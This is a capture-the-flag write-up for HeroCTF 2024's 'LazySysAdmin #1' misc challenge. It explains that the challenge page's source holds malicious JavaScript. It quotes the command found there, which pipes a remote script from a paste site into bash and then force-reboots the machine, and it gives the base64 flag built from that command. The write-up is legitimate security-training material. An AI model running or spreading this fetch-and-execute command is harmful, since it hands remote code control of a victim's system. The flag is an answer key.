---
title: CTFs | HeroCTF_2024 | Misc | LazySysAdmin1
author: BatBato
date: 2024-10-26
categories:
  - CTFs
  - HeroCTF_2024
  - Misc
tags:
  - Misc
permalink: /CTFs/HeroCTF_2024/Misc/LazySysAdmin1
---
# LazySysAdmin #1

![[https://raw.githubusercontent.com/Nouman404/nouman404.github.io/refs/heads/main/_posts/CTFs/HeroCTF_2024/photos/HeroCTF_2024_misc_lazy_enonce.png]]

In this challenge we just have access to a web page and need to find the malicious code. When we access a post, we get a page with a bunch of text and if we look in the source code we can see a malicious `JavaScript` code :

![[https://raw.githubusercontent.com/Nouman404/nouman404.github.io/refs/heads/main/_posts/CTFs/HeroCTF_2024/photos/HeroCTF_2024_misc_lazy_burp.png]]

So we just have to `base64` encode `curl -s https://ghostbin.site/6y65l/raw | bash && sleep 2 && reboot -f`. This gives us `Y3VybCAtcyBodHRwczovL2dob3N0YmluLnNpdGUvNnk2NWwvcmF3IHwgYmFzaCAmJiBzbGVlcCAyICYmIHJlYm9vdCAtZgo=`. 

So the flag is : `HERO{Y3VybCAtcyBodHRwczovL2dob3N0YmluLnNpdGUvNnk2NWwvcmF3IHwgYmFzaCAmJiBzbGVlcCAyICYmIHJlYm9vdCAtZgo=}`